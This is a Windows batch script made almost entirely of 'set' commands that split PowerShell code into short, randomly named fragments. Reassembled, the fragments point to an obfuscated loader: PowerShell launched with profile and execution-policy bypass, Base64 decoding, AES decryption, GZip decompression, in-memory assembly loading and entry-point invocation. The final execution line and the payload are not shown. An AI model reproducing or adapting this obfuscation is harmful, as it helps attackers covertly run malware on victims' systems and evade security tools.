@echo off
set "HBwNvfVtBI='txe"
set "yeBjZGQvTK=Obje"
set "iJJnIeHUpW=)))"
set "ZjDGUNbJXf=pose"
set "lbQwmvtfiH=ring"
set "KVFnbZdVpq=Comp"
set "nvsdGyyRVb=rAP."
set "LwvWevSHMa=urit"
set "aFOuwPGjlh=NRZY"
set "oikFPToUMK=oint"
set "HOxwQXTCNj=Star"
set "PWDZRVNAKX=se()"
set "CkpIejYNXX=NRZY"
set "bqjCrvZvcV=raph"
set "LgrAieKLpc=$mIK"
set "fzdSFynRha= '')"
set "jTdnCOyqVT=[]] "
set "yrUFFubUQM=rtS4"
set "hwLxOrvPyg=esMa"
set "uMtcHPCxUe=$Tme"
set "lmifhUiatr=stem"
set "UbqPZCOGPy=; };"
set "rUabFeoXna=tem."
set "CSBBaZQlaQ=m.Re"
set "sSynxysMhI=Invo"
set "KDBlkANvjt=;$zz"
set "cZNQPkWtdC=3); "
set "kMJuLeHHHt=$mIK"
set "HLHTuCwNMO=ress"
set "FXmlZXDzzj=esaB"
set "HfKkaEKPfF=qNRZ"
set "zINUZmjaid=tryP"
set "bfHhROwQPU='[-1"
set "mPRoVBJMah=ke($"
set "WpHGEppCUu=ionM"
set "cQgLIMrTVk=Obje"
set "FwpdzReTJp=v) {"
set "oyeRbIfZgv=rity"
set "zorLuobnya=onve"
set "tIsziCjorv=AP.T"
set "rHqmTMeqka=]::("
set "cLbbmMtlPF=[Sys"
set "iNMxLhFsrL=rofi"
set "fPgJPAmJBz=ode]"
set "vjzccwAMzj=[-1."
set "vkGuUyYsXI=g = "
set "mwucHhLHvm= = $"
set "loZPQpdNxt=.Cop"
set "KDAsOIduDK=ZY.I"
set "TmOdQsOoxX=gnir"
set "aluluCOyQX=7;$q"
set "mmZrcBqTgf=, $A"
set "FViTtbFkHL=FcNh"
set "SIXHWMIhLi=in $"
set "MosEeQRdoC=-1.."
set "OoPnPsTYLV=6] -"
set "dLiXjcXFAh=t Sy"
set "IaLolLbTtg=$qNR"
set "UcAbZfjXKb=P.Su"
set "BTXVPCLdcn=Secu"
set "GCcbgUQgCg=comm"
set "VxEOmrMruG=$Aij"
set "xtaFxXnXTc=ypto"
set "pgqlaSUNYh=TzY."
set "vSXDzTaXZS=ress"
set "rJIrmhCGRC=$Aij"
set "IpiNMCsZIG=yTo("
set "iYfqHWxhti= [Sy"
set "YDgaWosAnq=Wyqo"
set "pFmHyvoYJL=comp"
set "AiFaDyOvCD=A = "
set "GMWrPWPZWp=]::N"
set "vAFNnnLdcN=Disp"
set "oxtJdBrXUr=.Mem"
set "viSkeaaWKR=);$q"
set "cZMGavLdZo=).Sp"
set "KNddmjwKSp=$zzr"
set "VzZCNlkhHV=ing("
set "utrlIXnGzC=[IO."
set "DHcWrnFBJC=lit("
set "vRMovPWAyp=grap"
set "ewNfuxmsoD=bjec"
set "RQfJMflhbq== $q"
set "uPYOctexrd=rAP "
set "DICXnJgkcX=]::C"
set "hUOKFZsMjZ=nage"
set "isKkgjNflJ=ptog"
set "uZyjlOEoNB=HTtJ"
set "bONivagPns=.Len"
set "QablaqXYYk=dV1k"
set "LIrQiJZyZQ=-joi"
set "idTBSxhxyg=-4] "
set "uFjdpIdSBv= = $"
set "IwDjXJgjTv=le  "
set "RsdxLraMbs=);$Q"
set "HrJxAHKGkI=e = "
set "MyusCekiLP=.Dis"
set "AiJzQLnrpq=ne);"
set "fKketXCeQl=$iPT"
set "EUgZTFzPzI=y.Pa"
set "fxrBscAKEv=, (,"
set "VZOwuCjdPC=Mode"
set "NIupbjWsNL=1] -"
set "VVhZlVgYwu=BC;$"
set "UXecdHotpW=)($A"
set "lWTaOJVKJR=pose"
set "hjMBMRxFzP=mory"
set "IlSAUYoBfc=7kGw"
set "nwXGvPharG=::('"
set "dbNKtJVueN=Eniw"
set "oQlVxacrzn=tem."
set "MkSTxtoZQt=ment"
set "DATKAbnFGS=] -j"
set "TwvyeMqtrz=('ev"
set "INlOmZnjqs=n = "
set "wOpgfKiJOP=stem"
set "bdUTfACzlu=GVcn"
set "JxJGTxpyyl=LRP "
set "jfBAbsCwHa=yste"
set "NWLzLQFJNB=ss -"
set "hsfrRaeSwq=hy.A"
set "FHRNKjItso=();$"
set "TUADRMbWcT=embl"
set "JumIgdQweR=]::("
set "Mjdjpmvzgs=yste"
set "gaFWcNKBMa=ew-O"
set "hMAvHnqsiw=Syst"
set "ugbsimDuLS=.Mod"
set "sGwMPSTvwm=.GZi"
set "miSKkNLWwS=-nop"
set "JVYNeBDyeL=ispo"
set "xamoPGRYrD=ecry"
set "MjsirqxywH=O.Me"
set "WvngmRUqbu=ptor"
set "GbbsCJEEpJ=ect "
set "CvPBUvpyTs=16] "
set "PPDaqnjiEO=New-"
set "CNJQGAqfuk=join"
set "sVkROqhgfj=sion"
set "stmxhYZgWC=.IO."
set "kbeWWcMxoh=ptog"
set "fDzGqTNXvv=oryS"
set "LbfIjVVpia=gMod"
set "maBNaawHqb=AijM"
set "UmXLAQtHmT=m.IO"
set "yiRIGsxUhI= [Sy"
set "gPZzfyjxES=6esa"
set "QfbFOMakuu=y.Cr"
set "BfPhcNkvyX=tion"
set "QSWApgVYHG=rGVc"
set "AutPmmHyRX=eam("
set "xnCmHQDOaV=DNJS"
set "KiUiuHFlqq=oL'["
set "DBLDwBTGqL=LzDr"
set "RfCkBkZNTu=MA ="
set "NzvVBARwqH=zm83"
set "BhWHIqKEbi=8kuY"
set "zzEafDsiOD=iPTz"
set "UcBOuEeexk=ateD"
set "VbpaPOdzgf=.Key"
set "YcbvLmcJTD=Bmor"
set "YUfbDMtYwv=ion."
set "alcvIPDmXv=Y.Pa"
set "GsWPGVEoqj=V = "
set "PDRNXZSOkz=ddin"
set "ixcuNlZQML=Disp"
set "dCZnNEIlrY=ct S"
set "qSMCpePkFu=trea"
set "pzehzyvejw=lBlo"
set "UemeEJysWa=tem."
set "KwPAsGgvOB=  $r"
set "TuACUZfoze=NRZY"
set "ZYBrZdnWXK=oin "
set "AjYRRsAHdL=F'[-"
set "YCuTQcvKKy=n ''"
set "UQFYxWcXEL=2VUN"
set "WCLQaftxWv=)($r"
set "cUPgOJwcJi=join"
set "jVfHjkKefK=CuSj"
set "TJVVVZrzrd='[-1"
set "KxxMZlwrNH=.Ass"
set "ZmwsUQCQeN=tv ="
set "qAjNXZJLew=..-1"
set "WxaIlpUfdq=e]::"
set "AAfTDiHFPv= [st"
set "LQGchHqiNE=form"
set "MWEGjPFIBj=Secu"
set "VYYbUSnmBP=;$QH"
set "cbamlcxXDE=();$"
set "FXXlcfslMT=R5jf"
set "RCNKoabkKz=gth)"
set "ZrexXJTLrw=[Sys"
set "uQhXffNwSk=iron"
set "ryQYrMOclU= New"
set "bWGrLnqAXc=1..-"
set "imweObKtAm=.-16"
set "KjbLAaoVkc=yste"
set "vQQxbMXJah=yj.T"
set "kXNUocHPmS=IoO3"
set "StuEyaxoCb=:: '"
set "ssammXRiIN=-joi"
set "WMuTiDlcPF=m.IO"
set "kvyQsdEsAI=and "
set "uHuvQuoMtQ=zY, "
set "nLFUevkJdQ=);$q"
set "DbMvqsDsJp=vert"
set "flVQjzMjuv=rt]:"
set "VyfTsOuAdA=kyhK"
set "ikWhAkTLkr=ose("
set "hNDjlQueen=ert]"
set "TMVApmTeMC=DrU "
set "DCJoVxVJFE==');"
set "GCsWBAKEYQ=U.En"
set "EYQGeodQIZ=pres"
set "cUusrFTYIJ=Eniw"
set "dYTNHJfAtZ== [S"
set "idFbvUZzsT=morF"
set "tBfUYpeWHp=Conv"
set "srYEhwZvWV=TllA"
set "YNWtKlueEx=brea"
set "STGuywctym=y]::"
set "NNwPQHwsTV=HO3I"
set "sccTnRmjou=S46e"
set "gCWvhAlgYe=aDNK"
set "AiNkFdWBwu=ijMA"
set "OJtIjmeDKs=nirt"
set "qMWgkCIfGF=ct S"
set "jYHyxYWOPT=pStr"
set "mvvtwIFrZY=);$m"
set "CerJaWaCeT=..-1"
set "DwhtaKdOoI= = ["
set "EYagcPgeFh=-Obj"
set "nNGHNymCXU=ose("
set "bYhFHxQFPW=('%*'"
set "OTBcIMVhgC=$rGV"
set "pNmmYSGYvq=);$r"
set "AOnNjlUKvp=File"
set "aBMXHlMyCI=A, 0"
set "LnWFUEWjTB=-ep "
set "cwlQCwKQtZ=MA);"
set "lrwCKZaSrI=stem"
set "ucPKISPgRa=Fina"
set "FaSLZPgsrt=ddin"
set "RaWOIsgXDz=.Cre"
set "BOXawzxJjl=NRZY"
set "xXVGVGYJzJ=THxh"
set "JybnCMphdL=;$iP"
set "QeIIlnnlHb=::De"
set "dmrYTQHDYX=rans"
set "rUZEXYtsdq=am;$"
set "RQchzAchYo=n ''"
set "pOzCNHGwZK=ach "
set "IdlZFwtThe=LRP."
set "ANJEGdMVaz= '')"
set "YWysfPozIT=null"
set "ZDpbHuBeoV=)) {"
